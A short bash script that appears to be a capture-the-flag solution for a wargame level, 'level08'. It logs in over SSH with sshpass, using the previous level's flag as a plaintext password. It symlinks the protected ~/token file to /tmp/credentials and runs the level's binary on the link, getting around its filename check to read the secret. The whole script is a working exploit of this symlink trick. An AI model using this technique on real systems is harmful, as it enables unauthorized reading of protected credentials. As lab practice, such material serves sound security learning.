#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level08@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level07/flag)

if [ $# -eq 1 ]; then
	sshpass -p $PASSWORD ssh -q $HOST -p $SSHPORT<<ENDSSH
	echo "[+] Create symbolic link to ~/token."
	ln -s ~/token /tmp/credentials

	echo "[+] Execute ./level08 with symbolic link." 
	./level08 /tmp/credentials

	rm -f /tmp/credentials
ENDSSH

else
	printf "usage: ./script.sh [host]\n\texample [host] - 192.168.1.128"
fi
